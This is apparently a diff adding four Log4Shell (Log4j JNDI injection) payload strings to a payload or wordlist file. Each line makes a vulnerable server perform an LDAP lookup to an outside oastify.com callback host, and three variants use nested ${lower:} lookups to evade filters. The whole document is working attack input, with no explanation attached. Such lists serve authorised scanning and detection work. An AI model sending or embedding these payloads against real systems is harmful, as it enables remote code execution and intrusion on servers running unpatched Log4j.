@@ -1,0 +1,4 @@
+${jndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/l_lower}
+${jndi:${lower:l}dap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/l_nested_lower}
+${${lower:j}ndi:${lower:l}dap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/l_char_j}
+${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/l_chars}
